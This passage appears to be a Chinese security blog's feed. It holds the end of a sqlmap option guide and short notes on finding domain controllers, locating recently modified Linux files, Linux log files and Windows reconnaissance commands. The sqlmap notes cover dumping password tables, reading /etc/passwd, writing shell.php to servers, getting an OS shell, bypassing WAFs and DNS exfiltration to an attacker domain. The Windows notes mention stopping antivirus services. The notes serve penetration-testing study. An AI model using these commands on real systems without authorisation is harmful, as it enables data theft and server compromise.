class="line"></span><br><span class="line">#### &lt;font color=red&gt;3. Detection &lt;/font&gt;</span><br><span class="line">风险等级</span><br><span class="line">​```bash</span><br><span class="line">   --level    # 1-5级（默认1）   payload文件xml：/usr/share/sqpmap/xml/payloads， win：sqlmap\data\xml\payloads</span><br><span class="line">   --risk     # 1-4级(默认1/无害), risk升高可能造成数据被篡改风险(update),2会增加事件的测试语句，3会增加OR语句的sql注入测试</span><br><span class="line">   --string / --not-string  / --regexp   / --code  / --text-only  / --titles    # 页面比较，基于bool的注入监测，依据返回页面内容的百年华判断真假逻辑。但有些页面随着时间阈值变化，此时需要人为执行标识真假的字符串</span><br></pre></td></tr></table></figure><h4 id="4-Optimization"><a href="#4-Optimization" class="headerlink" title="4. Optimization "></a><font color="red">4. Optimization </font></h4><p>优化性能相关的参数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--predict-output   <span class="comment"># 预设输出。根据检测方法，比对返回值和统计表内容，不断缩小监测范围；版本名，用户名，密码，Provileges，role，db名，表名，列名；</span></span><br><span class="line"><span class="comment">#与--threads不兼容；统计表</span></span><br><span class="line"><span class="comment">#进而精确定位是什么数据库和版本等，        /usr/share/sqlmap/txt/common-outputs.txt</span></span><br><span class="line"></span><br><span class="line">--keep-alive  <span class="comment"># 使用长连接，性能好，与--proxy不兼容， 但是大量长连接会严重占用服务器资源</span></span><br><span class="line"></span><br><span class="line">--null-connection   <span class="comment"># 只获取相应页面大小值，而非内容； 【用于盲注判断 真假】，降低网络带宽消耗；与--text-only参数不兼容(基于页面内容比较判断 真假)</span></span><br><span class="line"></span><br><span class="line">--threads=10  <span class="comment"># 最大并发线程，盲注时每个线程获取一个字符（7次请求），获取完成后线程结束；默认1，建议不要大于10（可能会影响站点性能）</span></span><br><span class="line"></span><br><span class="line">-o   <span class="comment"># 开启前三个性能参数（除了--threads）</span></span><br></pre></td></tr></table></figure></p><p><strong>指纹信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Figerprint</span></span><br><span class="line">-f  / --figerprint  / -b  /  --banner   <span class="comment"># dbms指纹信息； DBMS，操作系统，架构，补丁</span></span><br></pre></td></tr></table></figure></p><p>​     </p><h4 id="5-Enumeration"><a href="#5-Enumeration" class="headerlink" title="5. Enumeration "></a><font color="red">5. Enumeration </font></h4><p>枚举<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">     --schema --batch --exclude-sysdbs  <span class="comment"># sschema:元数据(使用默认选项)   -- batch:自动执行</span></span><br><span class="line">     --count</span><br><span class="line">     -a     <span class="comment"># --all</span></span><br><span class="line">     -b     <span class="comment"># --banner</span></span><br><span class="line">     --current-user</span><br><span class="line">     --current-db</span><br><span class="line">     --hostname <span class="comment"># 机器的主名</span></span><br><span class="line">     --is-dba</span><br><span class="line">     --users         <span class="comment"># 列出所有用户</span></span><br><span class="line">     --passwords</span><br><span class="line">     --privileges -U user_name  <span class="comment"># 查看用户的权限（不加-U就是查当前用户）</span></span><br><span class="line">     --roles</span><br><span class="line">     --dbs          <span class="comment"># 列出所有数据库</span></span><br><span class="line">     --tables</span><br><span class="line">     --columns</span><br><span class="line">     --schema       <span class="comment"># 列出information_schema信息    --schema --exclude-sysdbs </span></span><br><span class="line">     </span><br><span class="line">     <span class="comment"># Dump数据：</span></span><br><span class="line">     --dump  <span class="comment"># 获取表中的数据，包括列</span></span><br><span class="line">     --stop</span><br><span class="line">     --dump-all exclude-sysdbs   <span class="comment"># 除了系统库,...</span></span><br><span class="line">     -C   <span class="comment"># column</span></span><br><span class="line">     -T  glag_table</span><br><span class="line">     -D  dvwa</span><br><span class="line">     -X</span><br><span class="line">     -U   <span class="comment"># user</span></span><br><span class="line">     --start 100 --stop 200   <span class="comment"># 指定分段</span></span><br><span class="line">     --stop</span><br><span class="line">     --sql-query <span class="string">"select * from users"</span>   <span class="comment"># 后面加要执行的sql语句</span></span><br><span class="line">     </span><br><span class="line">     --exclude-sysdbs  <span class="comment"># 除去系统库</span></span><br><span class="line">     --pivot-column=P...   <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定库表的列</span></span><br><span class="line">-D dvwa -T users --columns</span><br><span class="line"><span class="comment"># dump数据</span></span><br><span class="line">-D dvwa -T users --dump</span><br></pre></td></tr></table></figure></p><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>是基于字典的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysql &lt;5.0没有information_schema库， mysql&gt;=5.0如果无权读取...</span></span><br><span class="line"><span class="comment"># access 无权读物MSysyObjects库</span></span><br><span class="line">--common-tables</span><br><span class="line">--common-columns   <span class="comment"># (Access系统表无列信息)</span></span><br></pre></td></tr></table></figure></p><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE SYSTEM:</span><br><span class="line">--file-read=<span class="string">"/etc/passwd"</span>   <span class="comment"># 读系统文件</span></span><br><span class="line">--file-write=<span class="string">"shell.php"</span>  --file-dest<span class="string">"/temp/shell.php"</span>   <span class="comment"># 写,前面是源文件，后门是要写入到的文件</span></span><br></pre></td></tr></table></figure><h4 id="UDF注入"><a href="#UDF注入" class="headerlink" title="UDF注入"></a>UDF注入</h4><p>详细的去查资料吧<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UDF injection:   (User Design Function)</span><br><span class="line">--udf-inject, --shared-lib   <span class="comment"># 编译共享库创建并上传到DB Server，以此生成UDF实现高级注入。</span></span><br><span class="line"><span class="comment">#Linux：share object, windows:DLL</span></span><br></pre></td></tr></table></figure></p><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OS:</span><br><span class="line"><span class="comment"># mysql, postgresql:  上传共享库并生成 sys-exec(), sys_eval()两个UDF</span></span><br><span class="line"><span class="comment"># MSsql： xp_cmdshell 存储过程(1.有就用，2.禁就启，3.没就建)</span></span><br><span class="line">--sql-shell</span><br><span class="line">--os-shell</span><br><span class="line">--os-cmd</span><br></pre></td></tr></table></figure><p>​     </p><h4 id="6-Miscelianeous"><a href="#6-Miscelianeous" class="headerlink" title="6. Miscelianeous:    "></a><font color="red">6. Miscelianeous:    </font></h4><p><img src="/sqlmap参数简介/z.png" alt><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-z  <span class="comment"># 参数助记符, </span></span><br><span class="line">--answer=<span class="string">"extending=N"</span>   <span class="comment"># 让出现提示的选项都选Y或N</span></span><br><span class="line">--check-waf   <span class="comment"># 检测WAF/IPS/IDS</span></span><br><span class="line">--hpp   <span class="comment"># 绕过检测WAF/IPS/IDS的有效方法；尤其对ASP/IIS 和ASP.NET/IIS检查</span></span><br><span class="line">--identify   <span class="comment"># 彻底检查WAF/IPS/I</span></span><br><span class="line">-mobile  <span class="comment"># 模拟智能手机设备</span></span><br><span class="line">--purge-output   <span class="comment"># 清除output文件夹</span></span><br><span class="line">--smart   <span class="comment"># 当有大量检测目标的时候，只选择基于错误的检测结果</span></span><br><span class="line">--wizard  <span class="comment"># 向导方式</span></span><br></pre></td></tr></table></figure></p><h4 id="7-General"><a href="#7-General" class="headerlink" title="7. General"></a><font color="red">7. General</font></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-s    <span class="comment"># sqlite会话文件保存位置</span></span><br><span class="line">-t    <span class="comment"># 记录流量文件保存位置</span></span><br><span class="line">--charset=GBK   <span class="comment"># 强制字符编码</span></span><br><span class="line">--crawl=3  <span class="comment"># 从起始位置爬站深度</span></span><br><span class="line">--csv-del=<span class="string">";"</span>   <span class="comment"># dump数据默认存在于","分割的csv文件中，可以指定其他分隔符</span></span><br><span class="line">--dbms-cred   <span class="comment"># 指定数据库账号</span></span><br><span class="line">--flush-session  <span class="comment"># 清空session</span></span><br><span class="line">--force-ssl    <span class="comment"># 让sqlmap知道访问的是https的网站</span></span><br><span class="line">--fresh-queries   <span class="comment"># 忽略seeeion查询结果</span></span><br><span class="line">--hex -v 3     <span class="comment"># dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原 </span></span><br><span class="line">--output-dir=<span class="string">"/tmp"</span></span><br><span class="line">--parse-errors    <span class="comment"># 分析和显示数据库内建保存信息</span></span><br><span class="line">--save   <span class="comment"># 将命令保存成配置文件</span></span><br></pre></td></tr></table></figure><h4 id="8-Windows-Registory"><a href="#8-Windows-Registory" class="headerlink" title="8. Windows Registory"></a><font color="red">8. Windows Registory</font></h4><p> win注册表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前提是有权限</span></span><br><span class="line">--reg-read  <span class="comment"># 读取</span></span><br><span class="line">--reg-add   <span class="comment"># 添加</span></span><br><span class="line">--reg-del</span><br><span class="line">--reg-key, --reg-value, --reg-data, --reg-type=<span class="string">''</span>    <span class="comment">#..键的值等于...</span></span><br></pre></td></tr></table></figure></p><p>​     </p><h4 id="9-injection"><a href="#9-injection" class="headerlink" title="9. injection"></a><font color="red">9. injection</font></h4><p>注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-p <span class="string">"id,referrer"</span>  指定扫描参数（即存在注入的那个参数），使 --level失效</span><br><span class="line"></span><br><span class="line">--skip=<span class="string">"name, user-agent"</span>   <span class="comment"># 排除指定的扫描参数</span></span><br><span class="line"></span><br><span class="line">--dbms  <span class="comment"># 判断数据库类型</span></span><br><span class="line">--dbms=<span class="string">"mysql"</span>   <span class="comment"># 指定只用mysql的方法进行注入</span></span><br><span class="line">--os=<span class="string">''</span>    <span class="comment"># 指定系统</span></span><br><span class="line">--invalid-bignum    /   --invalid-logical   <span class="comment"># bignum使用大数使参数值失效id=99999999；  logical 使用布尔判断使取值失效 id=13 AND 18=19</span></span><br><span class="line"></span><br><span class="line">--no-cast  <span class="comment">#  榨取数据时，sqlmap将所有结果转换为str，并将空格替换NULL结果</span></span><br><span class="line">--no-escape <span class="comment"># 关闭功能：（当payload中用单引号界定str时，sqlmap使用char()编码逃逸的方法替换str）</span></span><br><span class="line">--prefix   <span class="comment"># 前缀</span></span><br><span class="line">--suffix   <span class="comment"># 后缀    “...?id=1” -p id --prefix"')" --suffix "AND ('abc'='abc"</span></span><br><span class="line">--tamper=<span class="string">"xxxxx, yyyyyy, zzzzzz"</span>   <span class="comment"># 混淆脚本(可自定义脚本)，染过应用层过滤，ips，waf    位置:/usr/share/sqlmaptamper</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#伪静态注入(全是斜线，使用“*”符号来自定义注射位置) </span></span><br><span class="line">sqlmap -u <span class="string">"http://www.xxx.com/123/456*/789"</span> -v 4</span><br></pre></td></tr></table></figure></p><p>​     </p><h4 id="10-Techniques"><a href="#10-Techniques" class="headerlink" title="10. Techniques"></a><font color="red">10. Techniques</font></h4><p>技术<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#默认使用全部技术</span></span><br><span class="line">B:  Boolean-based <span class="built_in">bind</span></span><br><span class="line">E:  Error-based</span><br><span class="line">U:  Union auery-based</span><br><span class="line">S:  Stacked queries (文件系统，操作系统，注册表必须)</span><br><span class="line">T:  Time-based-bind</span><br><span class="line"></span><br><span class="line">--time-sec  <span class="comment"># 基于时间的注入检测相应延迟时间（默认5s）</span></span><br><span class="line">--union-cols 6-9  <span class="comment"># 默认联合查询1-10列，随--level增大最多支持50列 </span></span><br><span class="line"></span><br><span class="line">--union-char 123  <span class="comment"># 联合查询默认使用NULL， 极端情况下NULL可能失败，此时可以手动执行数值 </span></span><br><span class="line"></span><br><span class="line">--dns-domain attacker.com <span class="comment"># 攻击者控制了DNS服务器，使用此功能可以提高数据榨取速度</span></span><br><span class="line"></span><br><span class="line">--second-order http://1.1.1.1/a.php  <span class="comment"># 在一个页面注入的结果，在另一个页面体现出来</span></span><br></pre></td></tr></table></figure></p><p>​      </p><h1 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h1><p>获取指定数据库 指定表 指定列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--batch -D &apos;dbname&apos; -T &apos;tablename&apos; -C &apos;username.password&apos; --dump</span><br></pre></td></tr></table></figure><p>提权操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 数据库提权</span><br><span class="line">--batch --sql-hell</span><br><span class="line"></span><br><span class="line"># 系统提权</span><br><span class="line">--batch --os-shell</span><br><span class="line"></span><br><span class="line"># 执行系统命令(前提要有权限)</span><br><span class="line">--os-cmd=ls /</span><br></pre></td></tr></table></figure><p>把文件上传到数据库服务器中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py --file-write --file-dest &quot;服务器路径&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/sqlmap参数简介/sqlmap.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="sqlmap" scheme="http://www.xpshuai.cn/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>查找域控的几个常用方法</title>
    <link href="http://www.xpshuai.cn/%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://www.xpshuai.cn/查找域控的几个常用方法/</id>
    <published>2020-03-20T06:48:52.000Z</published>
    <updated>2020-03-20T06:50:22.756Z</updated>
    
    <content type="html"><![CDATA[<h4 id="查找域控的几个常用方法"><a href="#查找域控的几个常用方法" class="headerlink" title="查找域控的几个常用方法"></a>查找域控的几个常用方法</h4><p>1.net view</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p>2.set log</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set log</span><br></pre></td></tr></table></figure><p>3.通过srv记录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp.corp</span><br></pre></td></tr></table></figure><p>4.使用nltest</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:corp</span><br></pre></td></tr></table></figure><p>5.使用dsquery</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DsQuery Server -domain corp</span><br></pre></td></tr></table></figure><p>6.使用netdom</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;查找域控的几个常用方法&quot;&gt;&lt;a href=&quot;#查找域控的几个常用方法&quot; class=&quot;headerlink&quot; title=&quot;查找域控的几个常用方法&quot;&gt;&lt;/a&gt;查找域控的几个常用方法&lt;/h4&gt;&lt;p&gt;1.net view&lt;/p&gt;
&lt;figure class=&quot;high
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="域控" scheme="http://www.xpshuai.cn/tags/%E5%9F%9F%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>linux找出最近或者今天被修改的文件</title>
    <link href="http://www.xpshuai.cn/Linux%E6%89%BE%E5%87%BA%E6%9C%80%E8%BF%91%E6%88%96%E8%80%85%E4%BB%8A%E5%A4%A9%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E6%96%87%E4%BB%B6/"/>
    <id>http://www.xpshuai.cn/Linux找出最近或者今天被修改的文件/</id>
    <published>2020-03-20T03:58:08.000Z</published>
    <updated>2020-03-20T05:02:03.522Z</updated>
    
    <content type="html"><![CDATA[<p>参考：<a href="http://www.hackdig.com/01/hack-42547.htm" target="_blank" rel="noopener">http://www.hackdig.com/01/hack-42547.htm</a></p><h4 id="0x01-列出某个目录下今天创建或者修改的文件"><a href="#0x01-列出某个目录下今天创建或者修改的文件" class="headerlink" title="0x01 列出某个目录下今天创建或者修改的文件"></a>0x01 列出某个目录下今天创建或者修改的文件</h4><h6 id="1-显示目录home-ym下，今天创建或者修改的文件"><a href="#1-显示目录home-ym下，今天创建或者修改的文件" class="headerlink" title="1 显示目录home/ym下，今天创建或者修改的文件"></a>1 显示目录home/ym下，今天创建或者修改的文件</h6><p><code>ls  -al --time-style=+%D | grep &#39;date +%D&#39;</code></p><p>参数解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-a - 列出所有文件，包括隐藏文件</span><br><span class="line">-l - 启用长列表格式</span><br><span class="line">--time-style=FORMAT - 显示指定 FORMAT 的时间</span><br><span class="line">+％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期-a - 列出所有文件，包括隐藏文件</span><br><span class="line">-l - 启用长列表格式</span><br><span class="line">--time-style=FORMAT - 显示指定 FORMAT 的时间</span><br><span class="line">+％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期</span><br></pre></td></tr></table></figure><h6 id="2-按字母顺序对结果排序显示"><a href="#2-按字母顺序对结果排序显示" class="headerlink" title="2 按字母顺序对结果排序显示"></a>2 按字母顺序对结果排序显示</h6><p><code>ls -alX --time-style=+%D | grep &#39;date +%D&#39;</code></p><h6 id="3-按文件大小从大到小对结果排序显示"><a href="#3-按文件大小从大到小对结果排序显示" class="headerlink" title="3 按文件大小从大到小对结果排序显示"></a>3 按文件大小从大到小对结果排序显示</h6><p><code>ls -alS --time-style=+%D | grep &#39;date +%D&#39;</code></p><h4 id="0x02-列出某天所有被修改文件"><a href="#0x02-列出某天所有被修改文件" class="headerlink" title="0x02 列出某天所有被修改文件"></a>0x02 列出某天所有被修改文件</h4><h6 id="1-列出当前目录今天被修改的文件"><a href="#1-列出当前目录今天被修改的文件" class="headerlink" title="1 列出当前目录今天被修改的文件"></a>1 列出当前目录今天被修改的文件</h6><p><code>find . -maxdepth 1 -newermt &quot;2017-1-8&quot;</code></p><p><code>find . -maxdepth 1 -newermt &quot;1/8/2017&quot;</code></p><h6 id="2-列出系统中今天被修改的所有文件"><a href="#2-列出系统中今天被修改的所有文件" class="headerlink" title="2 列出系统中今天被修改的所有文件"></a>2 列出系统中今天被修改的所有文件</h6><p><code>find .  -newermt &quot;2017-1-8&quot;</code></p><p><code>find . -newermt &quot;1/8/2017&quot;</code></p><h4 id="0x03-查找被访问过的文件"><a href="#0x03-查找被访问过的文件" class="headerlink" title="0x03  查找被访问过的文件"></a>0x03  查找被<code>访问</code>过的文件</h4><h6 id="1-今天被访问的文件"><a href="#1-今天被访问的文件" class="headerlink" title="1 今天被访问的文件"></a>1 今天被访问的文件</h6><p><code>find /home -atime 0 #查看home 目录下今天被访问的文件</code></p><h6 id="2-查看几天之内被访问的文件"><a href="#2-查看几天之内被访问的文件" class="headerlink" title="2 查看几天之内被访问的文件"></a>2 查看几天之内被访问的文件</h6><p><code>find . -atime +2  # -atime n,  File  was last accessed n*24 hours ago.；查看当前目录三天之内被访问的文件</code></p><h4 id="0x04-查看被修改过的文件"><a href="#0x04-查看被修改过的文件" class="headerlink" title="0x04 查看被修改过的文件"></a>0x04 查看被<code>修改</code>过的文件</h4><h6 id="1-今天被访问的文件-1"><a href="#1-今天被访问的文件-1" class="headerlink" title="1 今天被访问的文件"></a>1 今天被访问的文件</h6><p><code>find /home -ctime 0  #查看home 目录下今天被修改过的文件</code></p><h6 id="2-查看几天之内被访问的文件-1"><a href="#2-查看几天之内被访问的文件-1" class="headerlink" title="2 查看几天之内被访问的文件"></a>2 查看几天之内被访问的文件</h6><p><code>find . -ctime +2  # -ctime n,  File  was last changed n*24 hours ago.；查看当前目录三天之内被修改过的文件</code></p><h4 id="0x05-更多查看文件的用法"><a href="#0x05-更多查看文件的用法" class="headerlink" title="0x05 更多查看文件的用法"></a>0x05 更多查看文件的用法</h4><p>… …</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考：&lt;a href=&quot;http://www.hackdig.com/01/hack-42547.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.hackdig.com/01/hack-42547.htm&lt;/a&gt;&lt;/p&gt;
&lt;h4
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux下面一些安全日志文件</title>
    <link href="http://www.xpshuai.cn/Linux%E4%B8%8B%E9%9D%A2%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6/"/>
    <id>http://www.xpshuai.cn/Linux下面一些安全日志文件/</id>
    <published>2020-03-20T03:57:43.000Z</published>
    <updated>2020-03-20T05:02:03.519Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件 /var/run/utmp 记录现在登入的用户</span><br><span class="line"></span><br><span class="line">文件 /var/log/wtmp 记录用户所有的登入和登出</span><br><span class="line"></span><br><span class="line">文件 /var/log/lastlog 记录每一个用户最后登入时间</span><br><span class="line"></span><br><span class="line">文件 /var/log/btmp 记录错误的登入尝试（注：可以查看电脑是否正在被爆破）</span><br><span class="line"></span><br><span class="line">文件 /var/log/auth.log 需要身份确认的操作(可能存在)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="日志" scheme="http://www.xpshuai.cn/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>Windows命令简记</title>
    <link href="http://www.xpshuai.cn/windows%E5%91%BD%E4%BB%A4%E7%AE%80%E8%AE%B0/"/>
    <id>http://www.xpshuai.cn/windows命令简记/</id>
    <published>2020-03-19T10:45:38.000Z</published>
    <updated>2020-03-19T10:46:52.943Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、windows系统基础命令"><a href="#1、windows系统基础命令" class="headerlink" title="1、windows系统基础命令"></a>1、windows系统基础命令</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 获取ip地址     linux：ifconfig -a</span><br><span class="line">Route print   路由信息</span><br><span class="line">Arp -a        arp缓存</span><br><span class="line">Netsh firewall show config  查看防火墙规则</span><br><span class="line">Netsh firewall show state   </span><br><span class="line">Netstat -an   获取端口信息</span><br><span class="line">Whoami        当前用户权限</span><br><span class="line">Hostname      主机名称</span><br><span class="line">Set           环境变量</span><br><span class="line">Query user    查看远程终端在线用户</span><br><span class="line">Systeminfo    获取操作系统版本、类型、位数等相关信息、安装；</span><br><span class="line">-b：      显示包含于常见每个链接或监听端口的可执行组件；</span><br><span class="line">-o：      显示与每个连接相关的所属进程ID；</span><br><span class="line">-v：      与b一起使用时将显示包含于为所有可执行组件创建连接或者监听端口的组件；</span><br><span class="line">Netstat -anb  进程号、端口开放情况、开放端口程序、监听端口组件</span><br><span class="line">Netsata -ano  tcp/udp协议信息、端口、进程号</span><br><span class="line">Netstat -anvb 进程号、端口所用协议、调用的可执行组件、第三方进程的系统路径等</span><br><span class="line">Net start 获取服务信息利用第三方漏洞提权、关闭杀毒软件、防火墙、以及关闭某些防护进程</span><br><span class="line">Net stop servicesname  停止服务命令</span><br><span class="line">Net start servicename  开启服务命令</span><br><span class="line">Tasklist /svc          获取运行的进程名称、服务、PID </span><br><span class="line">Driverquery            查看已安装驱动程序列表</span><br><span class="line">Net start              查看已经启动的windows服务</span><br><span class="line">Msinfo32               获取更加详细的信息</span><br><span class="line">Taskkill               是windows自带的终止进程程序</span><br><span class="line">TASKKILL [/S system [/U username [/P [password]]]]&#123; [/FI filter] [/PID processid | /IM imagename] &#125; [/T] [/F]</span><br><span class="line"><span class="comment">#例如：taskkill /pid 452 /f        